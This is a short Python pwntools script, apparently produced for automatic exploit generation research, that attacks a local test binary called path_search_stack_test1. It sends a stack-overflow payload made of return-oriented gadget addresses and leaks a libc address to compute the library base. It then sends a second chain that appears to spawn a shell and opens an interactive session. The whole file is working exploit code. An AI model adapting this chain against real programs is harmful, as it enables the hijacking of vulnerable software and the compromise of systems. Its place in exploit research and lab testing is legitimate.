from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/PBAEG/binaries/64bit/path_search_test/path_search_stack/path_search_stack_test1/path_search_stack_test1")
pwn.gdb.attach(p)
payload = b""
payload += b'hello world\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x85\x02@\x00\x00\x00\x00\x00#\x08@\x00\x00\x00\x00\x00\xf0\x0f`\x00\x00\x00\x00\x00\x90\x05@\x00\x00\x00\x00\x00\x1a\x08@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xd0\x0f`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x18`\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x08@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00H\x06@\x00\x00\x00\x00\x00x\x18`\x00\x00\x00\x00\x00\x98\x07@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
p.send(payload)
p.recvuntil(b'you find it!\n')
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x2ddc0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x400823) + p64(libc_base + 0x1dc698) + p64(libc_base + 0x54d60)
p.send(payload)
p.interactive()
